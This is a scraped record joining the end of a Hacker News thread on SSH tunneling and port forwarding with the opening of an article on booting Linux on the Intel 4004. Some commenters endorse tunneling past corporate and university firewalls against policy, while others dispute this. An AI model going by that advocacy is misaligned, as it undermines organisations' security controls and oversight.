I'm gonna do it unless explicitly forbidden. reply ddulaney 13 hours agorootparentprevI think that statement is pretty short-sighted. Bypassing corporate policy at work is risky. You might bring down negative consequences on yourself or your workplace. You have to understand what you are doing. You have to understand likely reactions. But also, bypassing corporate policy can have benefits. If I'm more productive or get a reputation as the guy who gets things done or don't get seen as a complainer or just generally produce results because I bypassed a policy, those are all benefits. If I can transform \"hey boss, it's gonna be another week on this project because I'm waiting on a policy exemption\" to \"here it is\", that's a benefit. You have to weigh whether the benefits outweigh the risks for you. reply ziml77 3 hours agorootparentI do agree, but I'm not sure people are actually thinking about the potential risks. Because it's easy to say \"what risk can there possibly be?\" but it's hard to actually answer that dismissive question. Also, the if there is risk analysis it may be overly focused on the short term. I've worked with \"here it is\" kind of people... and had to deal with the messes they leave behind. Those people get praised in the moment at the expense of the future (some of those cases were actually recognized eventually and the people were let go). reply crispyambulance 9 hours agorootparentprev[...] they're there for a reason [...] Yes it takes weeks/months to get access, then it takes weeks/months to get access. Not exactly. Everyone has to evaluate for themselves how legit the rules are and act accordingly. More often than not, boilerplate rules are thoughtlessly applied and there is no pragmatic process to handle the exceptions to those rules. Admittedly, it's a risk to break such rules. One has to be an adult and use good judgement. It's OK, most of the time. reply saagarjha 11 hours agorootparentprevMany corporate networks show a lack of professionalism and a disrespect for the people the network was designed for. reply prmoustache 11 hours agorootparentprevIn many corporate cases, SSH tunneling is the desired way of accessing a closed by default port on a firewall. Very often from a predefined bastion host. If you don't want to open a range of IPs, it allows only people with their ssh key registered on either a selected bastion host or the server to open a specific port. It can also be a way to authenticate users. For example if you want to secure the access to an open source version of an app for which only the proprietary enterprise tier allow authentication by ldap/AD/oauth2. You can have ssh authenticate against LDAP/AD/oauth2 and leave the app running without authentication enabled or with a single user. As long as you don't need RBAC/privilege separation or some kind of auditing of what each user does on the app this is a particularly valid solution. reply atoav 10 hours agorootparentprevI will do everything by the book if your company gives me a person that can help me within half an hour. If every request needs days to complete and then doesn't work and then I have to make another request – if I wouldn't know better I would call it sabotage. From the CIA simple sabotage field manual: Insist on doing everything through “channels.” Never permit short-cuts to be taken in order to expedite decisions. reply barbs 17 hours agorootparentprevSometimes they are. Sometimes that reason is long forgotten, or isn't really valid anymore, or is an overprotective measure and not really a good reason in the first place. Quite often it doesn't justify waiting weeks or months to get it changed. reply hmottestad 12 hours agorootparentprevNew version of https://xkcd.com/303/ ? \"Waiting for corporate to punch a hole through three firewalls for me to get access to the test server :P\" I was on a project once where a consultant had dropped their laptop and it had taken a week or two to get fixed. After that everyone had to use a laptop provided by the client. When we scaled up the project with 3 more developers the project manager who had set up this policy discovered that the lead time for 3 dev laptops meant that the new developers got to be bored for a month at a fairly high hourly rate. reply FroshKiller 18 hours agorootparentprevCan you cite any examples of damage resulting from personal browsing over an SSH tunnel that the worker was held liable for? reply wakawaka28 13 hours agorootparentThat is an awfully specific question. Here are a few examples of what could happen though: - Malicious code on a webpage compromises your computer. - You download unauthorized software to install, which possibly even comes from a known-bad source. - Your employer could have trouble establishing that their patent is legitimate because you accessed documentation from a competitor. Even if the worker avoids liability for costly mistakes, the company will be set back. You can also be fired for breaking rules like that even when there are no actual damages. reply theideaofcoffee 17 hours agoprevThe filthiest SSH tunneling hack that I've ever done was at 3AM while in a three-way... datacenter connection. The interesting part of that, while the three facilities, spaced out over a single metro area had upstream transit connectivity to the rest of the net, only two pairs were able to reach the other due to some odd routing policies that weren't able to be resolved in time. That meant that A could connect to B, and only B could connect to C. The data I had to move from facility A to facility C via B in the most ridiculous rsync+ssh tunnel+keys+routing shenanigan mashup I've ever done. It took a few tries to get the incantation exactly right, but it was magical seeing it all move as one. Looking back it is super obvious how I'd do it now, but back then being green, was a huge accomplishment. I still remember the exhilaration when I confirmed everything was synced up. reply lamnguyenx 17 hours agoparentjust check my comment in in this post using `~/.ssh/config` with ProxyJump, you can virtually jump between A B C D E ... or whatever. reply theideaofcoffee 17 hours agorootparentYep, had I known that nearly 20 years ago I would have done just that. That's the ideal way to do it now! reply bogantech 12 hours agorootparentIf it makes you feel any better, ProxyJump was only added in 2016 reply perakojotgenije 11 hours agoprevShameless plug: What to do when you want to ssh to your linux server or IoT device but they are behind the firewall and without a static IP? You can use a tunneling service like https://sshreach.me. reply 1970-01-01 18 hours agoprevI love the extra detail in the visualizations. My wish is for networking to have much more visual representation of traffic, especially at lower level connections. reply 0nate 18 hours agoparentHi.. Check out the diagrams here: https://www.nathanhandy.blog/articles/osi-model-revisited.ht... .. obviously this is only a static conceptual representation. Most network vendors will have some form of visual representation of traffic, but it's tyipcally only discreet metrics / graphs. reply 1970-01-01 17 hours agorootparentThat is a fantastic example. I will definitely try your HandyDash as well. We should have had the ability to see this detailed traffic breakdown 20 years ago. reply 0nate 17 hours agorootparentThanks for the feedback. I hope you find HandyDash useful. If you find any issues feel free to raise here: https://github.com/Nathan-Handy/HandyDash/issues reply apitman 15 hours agoprev> TCP-over-TCP > It lowers the throughput due to more overhead and increases the latency. On connections with packet loss or high latencies (e.x. satellite) it can cause a TCP meltdown. This actually isn't a problem with SSH tunnels unless you're using TAP/TUN, because It unpacks and forwards the TCP streams. But you can still get reduced performance with multiple channels due to head of line blocking. reply Snawoot 7 hours agoparent> But you can still get reduced performance with multiple channels due to head of line blocking. Later problem can be solved with the use of pool of separate SSH connections: https://github.com/Snawoot/rsp?tab=readme-ov-file#performanc... reply lidder86 13 hours agoprevsshuttle go have a read much nicer for tunnelling... sshuttle -r user@host 10.0.0.0/8 Anything on 10/8 automatic tunnel it's pretty much a vpn over ssh reply jwrallie 19 hours agoprevI learned how to use ssh tunnels when wanting to bypass a firewall in my university network around 15 years ago, had to change the default port to 443. Been using it ever since for so much more than just bypassing firewalls. reply metadat 19 hours agoparentWhat purpose have you enjoyed it for beyond bypassing firewalls and exposing local services across a network? reply lytedev 18 hours agorootparentI use it for proxying general internet traffic (such as from your web browser) using the SOCKS5 proxy described in the article. Combined with FoxyProxy or similar it's nice if you want certain traffic (such as to a certain domain which only allows certain IP blocks) to flow from a certain host based on things like the domain. reply jwrallie 18 hours agorootparentprevIn essence it is what you mentioned, these are a few practical uses: - Streaming region locked content from overseas. - Permanent reverse-tunnel for remote-access with autossh. - Increased security compared to making services visible to the internet. - Downloading scientific articles using my university's connection as a proxy. reply haolez 19 hours agoprevKind of related, but I was wondering if there is some kind of redirect functionality in SSH itself. Something like: - A wants to SSH into B - B tells A that it must connect to C instead - A transparently connects to C directly - B is not a part of the critical data path anymore Does something like this exist? reply lytedev 18 hours agoparentB could port forward (as in route packets?) to C, but I don't think there are any HTTP Permanent Redirect equivalents, no. Maybe you can explain the problem more and perhaps there's a more suitable solution? If you have a host that's somewhat embedded, you can have DNS handle the \"routing\" for you. You will have to handle fingerprint verification. reply bongodongobob 18 hours agoparentprevI think you could do that with a virtual IP. For some reason my firewall/router doesn't communicate DHCP option 67 correctly, it sends its own address no matter what I do so I had to set up a a virtual IP/rule to route all PXE boot traffic on whatever port that is going to the routers IP, over to the real PXE boot server instead. reply shmerl 18 hours agoparentprevIt would be misleading if A doesn't know that the real target is C. Otherwise you can use jump functionality From A: ssh -J B C If B doesn't need to be part of the path, just connect to C directly if it's doable. If it's not, then B will have to be a hop either way. reply zaptheimpaler 19 hours agoprevI've found VS Code can setup port forwarding tunnels if you remote into a host and its been very useful. Its graphical, no command line incantations to remember and I usually have it running anyways. reply KeplerBoy 13 hours agoparentAlso setting up code tunnels on the workstations I use regularly saves me a lot of headaches. Sure it's a crutch, ugly and probably unsafe but I'm not a networking guy and need to get my actual stuff done. reply EasyMark 4 hours agorootparentIt should be pretty safe if you’re using public/private keys (and passwords turned off), keeping all sshd along the path updated, and guarding them like a troll, otherwise it’s a bad choice reply yownie 16 hours agoprevI've used tunneling quite a lot over the years but never knew about -J option. What I'd really like is just some visual tool to configure my tunnels instead of spending 30 minutes very few months when I need to use a tunnel. reply asicsp 15 hours agoprevSee also: A Visual Guide to SSH Tunnels: Local and Remote Port Forwarding https://iximiuz.com/en/posts/ssh-tunnels/ reply elwebmaster 19 hours agoprevBookmarked, thank you. reply apitman 15 hours agoprev [–] SSH tunnels are an excellent tool, but nowadays you often want TLS and reverse proxy functionality built in. I maintain a list of such tools here: https://github.com/anderspitman/awesome-tunneling reply aborsy 14 hours agoparent [–] Your suggested solution Cloudflare Tunnels man in the middles the traffic and it’s not an end to end tunnel. It’s a tunnel to Cloudflare! The users should be warned about this! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The blog post provides an in-depth guide on port forwarding and tunneling, covering use cases, configuration, and limitations.",
      "Key topics include encrypting insecure connections, accessing web admin panels via SSH, and using SSH jumphosts to reach internal servers.",
      "Important configurations and commands for local, remote, and dynamic port forwarding are detailed, along with the limitations and potential security risks of SSH tunneling."
    ],
    "commentSummary": [
      "In 2024, configuring `~/.ssh/config` with `LocalForward`, `RemoteForward`, and `ProxyJump` is recommended to streamline SSH connections and save time.",
      "This setup allows seamless SSH, SCP, and RSYNC operations to a target server via an alias and forwards specific ports for local and remote access.",
      "Using `0.0.0.0` instead of `localhost` or `127.0.0.1` can expose ports on all network interfaces, so ensure proper firewall settings to maintain security."
    ],
    "points": 371,
    "commentCount": 54,
    "retryCount": 0,
    "time": 1726783218
  },
  {
    "id": 41600756,
    "title": "Linux/4004: booting Linux on Intel 4004 for fun, art, and no profit",
    "originLink": "https://dmitry.gr/?r=05.Projects&proj=35.%20Linux4004",
    "originBody": "Toggle navigation Dmitry.GR Myself Projects Thoughts Dmitry.GR/ Projects/ Linux4004 Linux/4004 Slowly booting full Linux on the intel 4004 for fun, art, and absolutely no profit (fullscreen viewing recommended) TL;DR I booted Debian Linux on a 4-bit intel microprocessor from 1971 - the first microprocessor in the world - the 4004. It is not fast, but it is a real Linux kernel with a Debian rootfs on a real board whose only CPU is a real intel 4004 from the 1970s. The video is sped up at variable rates to demonstrate this without boring you. The clock and calendar in the video are accurate. A constant-rate video is linked below. Table of Contents In the beginning... The 4004 Like we did in the good ol' days But with a twist... Control flow in the 4004 Memory and I/O in the 4004 4001 and 4308 4002 4265 4008, 4009, and 4289 Using memory, and those \"status nibbles\" Performance and clocking Some more annoying weirdness Initial planning Let's make a dev board Emulating my 4004 system The MIPS emulator Why MIPS A start Logical ops Shifts Space optimization and 4004-specifics Hypercalls Second-order hypercalls It is tight SD card driver and the last of the ROM space The emulator needs more ROM How to make ROM banking work Now that I have space... Hardware SPI PSRAM The VFD The UART The blinkenlights The easy level shifting The hard level-shifting problem Power supplies How to debug the hardware This is the 21st century! The garbled text mystery More MIPS emulator fun Memory translation Debugging the emulator MOV Playing tetris Speed optimization Methodology Fetch Memory copy More RAM Clawing it back Better shifts More RAM access unrolling A look at WHAT runs Fetch again On host CPU speed Hardware cost optimization \"Affordability\" The prices for 1971 chips The modern parts How it works The connections SD card access How it boots How it runs The art of it I want one Build one Kit or pre-built Making of the video Capturing Getting the data Getting desperate Making the video Downloads Credits Comments... In the beginning... In 2012, I ran real Linux on an 8-bit microcontroller (AVR), setting a new world record for lowest-end-machine to ever run Linux. A natural extension of that project was into something faster and more practical, and I did that. Others also did follow-up work based on the original project. Some exciting work also happened based on my LinuxCard followup, my favourite being this gem. Nobody really tackled the actual record for about eleven years. In 2023, there was this advancement. It is still an AVR, so it is not much lower-end, but it does use an AVR with less RAM, so it counts. This is especially true since the author was clearly aiming to beat my record (as per the README). An even more impressive effort was seen, also in 2023, here. That one boots Linux (in emulation) on a MOS 6510. This is a much older-style 8-bit CPU and thus definitely counts as lower-end than an AVR. So, it seems that after 11 years on top (or...bottom), my record had been beaten. This would not do! What would be lower-end than an AVR or a MOS 6510? AVR is a very modern pipelined architecture, delivering nearly 1.0 MIPS/MHz. The 6510 is also also rather performant per-cycle. This was not always the case with CPUs. Squeezing even half that performance per MHz out of, say, an 8086 would be quite hard. But 8086 is a 16-bit chip, so it would not necessarily count as lower-end than an 8-bitter. Intel 8080 exists, and it is an 8-bit chip from 1974. Its instructions take 4-11 cycles, so it is more typical of the original 8-bitters. however, the 8080 is just an upgraded version of the Intel 8008 from 1972, so logically the 8008 would be a more tantalizing target anyways, being older and thus cooler. At this point, though, we're approaching the start of microprocessor history, 1972 being only a year after the Intel 4004 came out. The 4004 is considered to be the first commercially-produced microprocessor. So, as long as I am going to go back in history, why not go all the way back? Plus, it being a 4-bit chip, this unambiguously sets a new low bar! Thus this project was born... The 4004 This is a not-so-short summary of how the 4004 works. I found a lot of information online about it that was incomplete, incorrect, or simply incomprehensible. Now that I've sorted it all out for you, enjoy! To skip this section (not advisable), click here. To read the original intel MCS-04 manual click here. Like we did in the good ol' days To someone used to today's MCUs, the 4004 will look mighty weird. To start with, it operates on 4-bit quantities only. The only flag is the carry flag. Instructions are mostly one byte long and take 8 clock cycles to execute. Some instructions are two bytes long and take 16 cycles to execute. Just to keep you on your toes, there does exist a single one-byte instruction that takes 16 cycles - FIN. However, that is only the beginning. The fact that this chip was developed for a calculator is quite evident in the fact that it has no logical operations at all. There is no AND, OR, or XOR operations at all. It is a one-operand instruction set, so the accumulator is usually the target of operations. So, if we have no logical ops, what do we have? ADD and SUB basically. To be precise, addition is always with carry and subtraction is always with borrow. This, again, shows off the 4004's \"calculator\" roots. For extra credit, and contrary to some of the docs you'll find out there, the usage of the carry flag during subtraction is quite weird... Some architectures treat the carry flag during subtraction as \"borrow\", as in: it'll be set if there was a borrow, and cleared otherwise. Other architectures treat the carry flag during subtraction as \"not borrow\", meaning that it'll be cleared if there was a borrow, and set if there was not. The key thing is that in every architecture I've evern encountered, it was one of those two options. But with a twist... The 4004 seemingly finds a third option. On the way in to the SUB instruction, the carry flag means \"borrow\", but after the SUB instruction, it means \"not borrow\". Yes, this is correct and I've verified this on the real hardware. I read one old newsgroup post (that I can no longer locate) where this was blamed on not having space for an extra XOR gate in the chip. The practical upshot of this is that to add a multi-nibble number to another multi-nibble number, simply clearing the carry up front and then using ADD on each nibble will work. To do a multi-nibble subtraction, one needs to not only clear the carry bit up front, but also invert it after each SUB instruction. The 4004 is surprisingly register-heavy for such an early design. It has 16 internal registers, each 4 bits in size. PC is 12 bits long, and the hardware return stack is 4-deep. The current top element of the stack is used as PC so maximum actual function nesting possible is 3-deep. All together, that is 112 bits of state, which would be a whole lot of transistors in 1971, if you were to make that out of SRAM. It would take 672 transistors. That's quite a lot for a chip whose total transistor count is 2,300. So what did Intel do? They used DRAM for these bits! This is one of the reasons that the 4004 has a minimal clock speed, below which it will fail to work. This is rather unlike modern microcontrollers, most of which can operate all the way down to DC. Another slight weirdness is that 4004 has no interrupt support at all! An unexpected luxury in a one-operand CPU is the presence of direct operations on memory operands. Well, only FROM memory, but still. There exists ADM which adds a nibble from RAM to the accumulator and SBM that subtracts a memory nibble from the accumulator. Other than those, all other operations only operate on the accumulator, sourcing data from the internal registers when a second operand is needed. Another somewhat weird thing is that while there is an instruction to load a register value into the accumulator (LD), there is not one to write the accumulator to a register. To do that one must use the XCH instruction that swaps the accumulator's value with that of a register. This is somewhat annoying since storing the same value into two registers now takes three operations instead of two. I guess that this was a compromise necessary to fit all the desired instructions into the encoding space provided by just-8-bit-long instructions. So what else is there? Of course there is NOP, encoded officially as 0x00, but any byte less than 0x10 is treated as such. This is not a coincidence. The 4004 treats each instruction as being made of two 4-bit parts. The high part is called OPR and is sent on the bus first. The low byte is called OPA and is sent on the bus second. In general, OPR encodes the instruction and OPA is the parameter/index/etc for it. With this in mind, it is understandable why every instruction with the top nibble of zero is a NOP. Some instructions you'll find in the 4004 are pretty typical of early processors. IAC (increment accumulator) and DAC (decrement accumulator) make an appearance, of course, acting on the accumulator and setting the carry flag. But there is also INC which will increment a register and will not affect the carry flag. There is no DEC. Loading an immediate nibble-sized value into the accumulator is accomplished using LDM. Bit-shifts are always by one bit and always though the carry flag. RAR (rotate right) and RAL (rotate left) thus deliver precisely what they promise. Since the carry flag is so often used, there are instrctions specifically for managing it. STC (set carry) will set it, CLC (clear carry) will clear it, and CMC (compliment carry) will toggle it. There is also CLB (clear both) which will clear carry as well as the accumulator and TCC (transfer and clear carry), which will set the accumulator to the value of the carry flag (0 or 1) and clear the carry flag itself. This turns out to be useful in all sorts of places, actually. Finally, there is TCS (transfer carry for subtraction) which is more useful for BCD math than it is for binary math. It will set the accumulator to \"9 + carry\" and clear the carry flag. I have found no use for this instruction yet in my code. As far as weird instruction go, there are two more that are not all that useful. DAA (decimal adjust for addition) is one. If the accumulator is 9 or greater, or if the carry is set, 6 is added to the accumulator. Carry is set if the addition generates a carry, it is not affected in all other cases. This is also used for BCD math and is thus useless for my purposes. Another instruction of dubious value is KBP (keyboard process). It implements something like \"count trailing zeroes\", but only for powers of two. For an input of 0, it produces zero, for an input that is a power of two, it produces one more than the log base two of the value, for all other inputs it produces 15. This was meant to allow for easy keyboard decoding, I suppose. There are two more ways to load immediates in the 4004, and both of them are a godsend for writing actual useful code. First, there is FIM (fetch immediate). This two-byte instruction will load 8 bits of immediate data into two consecutive registers, starting with an even-numbered one. The accumulator and the carry bit are unaffected, making this a nice way to load loop counter values into registers. A similar, in some ways, FIN (fetch indirect) will load two consecutive registers with an 8-bit immediate loaded from the code ROM's current page. As the 4004 is a Harvard-architecture CPU, the code and data spaces are entirely different and this is one of the ways to make constant tables work. Since using a single nibble as the address would not work, two registers are used, allowing for addressing up to 256 bytes of data. There would not be enough encoding space in the 8-bit instruction to encode a 3-bit destination register pair number, a 3-bit source register pair number, and the 4-bit OPR. Two possibilities existed here. One would be to use the same register pair for input and output. This would preserve the orthogonality of the instruction set but make actual use harder. The second (and what intel chose) was to hardcode one of the register sets. And indeed, FIN always uses r0:r1 as the address to read from, while the destination register pair is encoded in the instruction, and may, in fact, be r0:r1. Control flow in the 4004 As I mentioned, there is a hardware stack for subroutines. JMS (jump to subroutine) is a 2-byte instruction that will push the address of the next instruction onto the hardware stack and then jump to anywhere in the 12-bit code address space. JUN (jump unconditional) will do the same without pushing a return address. Both of these can thus reach any instruction in the code address space. Returning from a subroutine is accomplished using BBL (branch back and load), which will jump to an address popped from the return stack and load an immediate encoded in the instruction into the accumulator. An astute reader will note that this means that it is thus impossible to return a dynamic value from a subroutine in the accumulator, and this is so. This is actually similar to PIC12's RETLW, and may be used as such, to implement tables of data. That would, however, require an ability to execute a calculated indirect jump. And that ability exists. JIN (jump indirect) will jump to an address in the current code page that comes from a pair of consecutive registers. Another unexpected creature comfort is the ISZ (increment and skip if zero) instruction. It does not quite do what you'd think though. It will increment a register with no effect on carry, if the result is not zero, it will jump to an address encoded in the instruction (and limited to the current code page). If the result was zero, it will not jump and execution will continue after it. This can be used to implement loops relatively easily. Conditional jumps in the 4004 are also somewhat strange. 16 possible conditions exist, and given what you know about the 4004 so far, try to guess how that is possible! Sure, one can branch on carry, or on accumulator being zero, but that does not make 16 possible conditions. JCN (jump conditional) will execute a conditional jump to an address in the current code page if the specified condition is met. The condition is made of three clauses, each of which may be enabled, and considered met if any of the enabled clauses are true. There is an extra bit in the encoding to invert the final result. The clauses are: \"accumulator is zero\", \"carry is nonzero\", \"TEST pin is logical zero\". Indeed this means that complex conditions can be tested in one instruction. In reality, though, this does not work and combinations that you'd want end up being impossible. For example, I would have loved an \"jump if accumulator is zero and carry is zero\" or \"jump if accumulator is nonzero or carry is nonzero\" but neither of those is encodeable in the way intel chose to implement this instruction. \"Now what is this TEST pin?\" you might ask. This is an input pin directly on the 4004 that can be tested directly via a conditional jump. This is the only input that is on the 4004 directly and this is as close as you'll get to handling interrupts on the 4004. If your external hardware signals some condition via this pin and your code remembers to poll it often enough, you could use this to signal your code about external events. This is the only general-purpose input pin on the 4004. It has no general-purpose output pins. I mentioned code pages above. What does this mean? While the entire code space is 4096 bytes (addressable via 12 bits), some instructions lack the encoding space to address it all. So, a \"code page\" is just the range of code ROM that contains the current PC, starting at the previous multiple-of-256-address and ending just before the next one. It should be noted that \"current PC\" is the address of the NEXT instruction. This matters for instructions that end on a page boundary. Such instructions thusly placed can only target the next page. FIN, JCN and ISZ are affected by this. This situation of conditional branches being limited in range compared to unconditional ones is common, and even modern architectures like ARMv6M have similar limitations. Memory and I/O in the 4004 The 4004 is not quite a complete processor. There are some instructions that it does not process at all. In fact, it does not at all process any memory instructions. Memory instructions are all whose OPR is 14. For them, the CPU will look at the top bit of OPA only. If it is set, the instruction is a read and during the X2 bus phase, the CPU will sample the bus and consider that the read value. If the top bit of OPA was clear, the CPU will place the written value onto the bus during the X2 phase. What is interesting here is that there are a few different read instructions and a few different write instructions, and the CPU knows nothing about how to perform them. When it sees an OPR of 14 (which will happen during the first bus phase fetching the instruction - the M1 phase), it will activate the CM-ROM and CM-RAM of the currently-enabled ROM and RAM banks, thus notifying all memory chips to watch the second nibble of the instruction (which will be sent during the next bus phase: M2). They watch the value of OPA (during bus phase M2), decide if they can execute this instruction, and if so, place the proper value or get the proper value from the bus during phase X2. So, one could argue that the 4001/4002/4289/4265/4308 memory chips are part of the CPU, since they decode and execute certain instructions. Intel used this to great success in the 4289 and 4265, which will decode many of the instructions in that space differently. One could even imagine a coprocessor that allows 4004 to execute custom instructions and transfer 4 bits of data per instr using this ability. It is also interesting that the 4004 has no addressing modes, not even the concept of that exists. Its support for memory is rather rudimentary, in fact. It is also rather unlike what modern chips do, so I'll explain it. First of all, there can be up to 8 banks of RAM. Up to 4 banks can be supported without any external decode circuitry, and up to 8 can be supported with an external 3-to-8 decoder. How can this be? The 4004 has 4 CM-RAM outputs, which are basically RAM bank selects. If banks 0..3 are selected, only the respective CM-RAM line will be active during the proper time. If banks 4..7 are selected, a combination of CM-RAM pins is activated, but no combination includes CM-RAM0. Thus 7 combinations are possible, but of them one is al zeroes (unused), and three are a single active line (already accounted for above), thus there are four more combinations possible here, and they are used to encode banks 4..7. In reality, one could expand this infinitely, simply by using a few external latches and some OR gates to only pass the select signal to some chips but not others. I am not aware of any design that did this, but I verified that this works as you'd expect. The 4004 only has one CM-ROM (ROM select signal), and thus can only natively address just 4096 bytes of ROM. Here, too, with minimal external circuitry one could expand this to more. 4001 and 4308 Intel intended the 4001 to be the ROM for the 4004. It is a mask ROM that holds 256 bytes of data and contains a 4-bit I/O port. Each 4001, internally, knows its own \"ROM number\". What is that? Well, the 4004 can address 4096 bytes of ROM and the 4001 only holds 256. Logically one would need 16 4001s to fill the address space, but since there are not 16 chip selects coming out of the 4004, how would each ROM know when it is addressed? The last nibble transferred from the CPU on the bus during the A3 phase is compared by each 4001 to its internal \"ROM number\". If it is not a match, the 4001 will do nothing more till the next instruction cycle. If it is a match, it will consider itself active and provide data the 4004 requested, from the address it got during the A1 and A2 bus phases. The 4001 is not programmable, it was meant to be custom-made for a customer. One would ship to intel the bytes one wanted in the ROM and intel would manufacture the 4001 containing those bytes - they are physically wired into the chip via its metal mask. The same applies to the I/O port on the 4001. It is a 4-bit wide port, and each pin could be an input or an output; have a pull-up, pull-down, or neither; could be inverting or not. The diagram shown here shows all the options. Each depicted switch could be closed or open. Some combinations, of course, make no sense, and intel warns so in their datasheet. If you happen to buy a 4001 on eBay, you have no idea what its port config and \"ROM number\" is. You just have to test. Most ROMs out there are \"ROM number\" 0, which makes them especially useless for a home project. If they respond to address 0, then your code (presumably elsewhere in the address space) will never get to run. So why would you even buy a 4001 if it permanently contains code you cannot modify? Well, for the chance that it has an input port, since the 4002 does not, for some reason. As I had mentioned above, the 4004 does not perform any memory operations - the other chips on the bus are expected to decode them and perform them if they are selected. The \"selection\" is made of a few parts. First is the CM-ROM line needs to indicate that this ROM bank is active during bus phase A3 (for code read) or X2 (for I/O ops). In the 4004, there is only one ROM back, so this is always the case. The 4040 has two CM-ROM lines and thus one bank may be not selected. The second part of \"selection\" is whether the current chip in the bank is selected. This is determined from the last SRC instruction performed while this bank was selected. The chip thus addressed remembers this until another SRC instruction is observed while this bank is selected. So, which instructions does the 4001 decode and execute? SRC is used to select which 4001 (of the 16 that make up a bank) is selected for I/O. The top nibble of the provided address (sent during X2 bus phase) determines which chip considers itself selected for I/O. Besides that, the 4001 only handles WRR (write ROM port) and RDR (read ROM port) instructions, and they do precisely what you'd expect from the names. As the I/O pins are not configurable and direction is locked at manufacturing time, there is no further config to perform. One curious thing is that when performing a read of the port, the I/O lines configured as outputs do not return the data they are outputting, instead they return a hardcoded value, that may be configured at manufacturing time to be either high or low. The 4308 is basically the same as four 4001s in one package. It contains 1024 bytes of ROM and 4 I/O ports. It responds to four consecutive \"ROM numbers\". It is just a board-space optimization with nothing else interesting about it. 4002 The 4002 is the special memory for the MCS-04 system. It contains 320 bits of DRAM, refresh circuitry, and a 4-bit output-only port. I am not sure why intel made this decision, but this is so. Unlike the 4001, there is no mask ROM in here, so there would be no way to assign a \"RAM number\" to a chip. A different system is used. Each bank of RAM may have 4 4002s in it. So, logically, to determine a chip's index in a bank, we need two bits of information. One bit (the lower one) comes from the P0 input pin on each 4002 itself. The second bit is special per chip model. There are two: the 4002-1 and 4002-2. Thus a complete RAM bank, in order, will be made of: a 4002-1 with P0 = Vss, a 4002-1 with P0 = Vdd, a 4002-2 with P0 = Vss, and a 4002-2 with P0 = Vdd. While the 4004 only has one CM-ROM output, it has 4 CM-RAM outputs, and as I mentioned above, this allows up to 4 banks of RAM without external circuitry and up to 8 with a single extra chip. So, a top-spec 4004 system without an extra decoder chip can have 16 4002s attached to it, for a total RAM capacity of 5120 bits (640 bytes). With a 3-to-8 decoder, the numbers double. In reality, memory addressing is not quite simple in 4004. So, if you were to only consider RAM you could address as a linear block that you could iterate over using a pointer, it is important to remember that each 4002 only has 256 bits of that. So a top-spec system would have 4096 bits (512 bytes) of that kind of directly-addressable RAM, assuming full 4 banks. I'll talk more about RAM addressing in the 4004 later. For now: each RAM bank is made of 256 nibbles addressable directly and 64 more, addressable weirdly. So, what instructions does the 4002 handle? SRC, again, is used to select the chip in the current bank, both for I/O as well as for memory access. The top 2 bits of the 8-bit address sent select one of chips in the RAM bank. RDR, ADM, and SBM all read the nibble addressed by the last address sent via the SRC instruction. RD0, RD1, RD2, and RD3 read the status nibbles (more on them later). WR0, WR1, WR2, and WR3 write the status nibbles. WRM writes the SRC-addressed nibble - it is the opposite of RDM. The only other instruction the 4002 executes is WMP (write memory port), which sets the output value to be presented on the 4-bit output port of the currently-selected chip. The value will keep being outputted till another is written. Sadly, there is no 4308 equivalent for RAM - there is no chip that would act like a full bank of RAM for the 4004. The 4265 can sort-of come close, but not in a fully compatible way. 4265 The 4265 is a general-purpose I/O device designed for the MCS-04 system. It has 4 ports of 4 I/O pins each and supports a number of modes of operation. You can peruse the intel docs on it at your own leisure to read about all the modes. I will only tell you about mode 12, as it relates to using the 4265 for RAM. In mode 12, the 4265 takes up an entire CM-RAM bank and responds to all 256 addresses that a SRC instruction might send. It can be interfaced to a 256x4 SRAM and it will read and write precisely like 4 4002s would. But wait, there is more, since 4265 in this mode also has 2 chip select pins that can be set to arbitrary values. If one were to use them as address lines too, one can interface a 1024x4 SRAM, which is a lot more RAM than a single RAM bank of 4002s could ever hold. Indeed, one would need to switch pages in this bank, as only one 256-nibble view is available at a time, but this is still pretty cool. The reason as to why this is not fully 4002-compatible is that there are no \"status nibbles\" here, so a 4265 + 256x4 SRAM is not a full replacement for a bank of 4002s if the code at all uses \"status nibbles\". When I talk about how they work and the advantages of using them, you'll see why this matters. Additionally, while the 4265 indeed has as many potentially-output port pins as 4 4002s would have, the way to control them is also not compatible (and, in fact, if you use 4265 for RAM access, you end up with no general-purpose output pins at all). So, which instructions can the 4265 execute? SRC is decoded, as always, to handle inputting an address, of course. WMP (write memory port) is used to select the 4265 mode. In mode 12, RDM, ADM, and SBM will read the addressed nibble in the addressed page of memory. RD0, RD1, RD2, and RD3 select the given page, and then do a read. WR0, WR1, WR2, and WR3 select the given page and then do a write. WRM writes a nibble at the current address in the current page. 4008, 4009, and 4289 Given that intel will no longer manufacture you a 4001 with your custom contents (I called and asked), and the fact that the MCS-04 bus is rather strange and no other memory chip supports it, one might expect that one will need to do some perverted things to run code on a 4004 today. Of course, a simple FPGA, or even a modern microcontroller with a lot of level shifters could manage to pretend to be a 4001, but this is considered cheating in my book. Luckily, there is another way. There are two, even! Intel created a two-chip solution for a 4004 system to interface to normal garden-variety [[E]EP]ROMs: the 4008 and 4009. The 4008 handles the addressing part - it understands the MCS-04 bus protocol enough to tease out a 12-bit address that the CPU wants to read and can output that on 12 pins. Fancy that! The 4009 also understands the MCS-04 bus protocol, and it decodes memory instructions and generates control signals to handle I/O, ROM reading, and, optionally, writing in some weird ways that I prefer not to think about. It will also latch the 8 bits of data that represent an instruction and dish it out to the 4004 four at a time, as needed. The 4009 understands the same instructions as the 4001 does, except that instead of the I/O port being hardcoded at the intel factory, each write and read is output 4-wide to the outside world, to be dealt with as desired. This allows for a lot more flexibility. There is one more instruction that the 4009 understands that the 4001 does not: WPM (write program memory). This was meant for situations where the backing store was not [[E]EP]ROM but SRAM (eg for development). It works in weird ways that are beyond the scope of my lecture. The 4008 and 4009 still need level shifters to connect to normal memories, since they were designed for the 15V EPROMS intel made, like the C1702A. The 4008 and 4009 are also rather hard to obtain nowadays. Luckily, intel also produced a combined chip - the 4289. It is basically a 4008 and a 4009 in one package, with level shifters built in. It can communicate with memories at 5V signal levels! This makes using a 4004 today pretty easy - a 4289 and a 5V 4096x8 [[E]EP]ROM is all it takes, really. The I/O story on the 4289 is also pretty simple and 5V-compatible. There is a pin that goes high when the CPU does an I/O read, and the 4-bit \"I/O port\" selection is available on 4 pins. Another pin goes high when the CPU does an I/O write, and the data appears on the I/O pins. In theory, this allows connecting up to 16 4-bit input ports and 16 4-bit output ports to the 4004, using simple buffers and decoders. Using memory, and those \"status nibbles\" The 4004 has no concept of addressing modes or even pointers, as I said. The way it addresses and uses memory is rather ... strange. 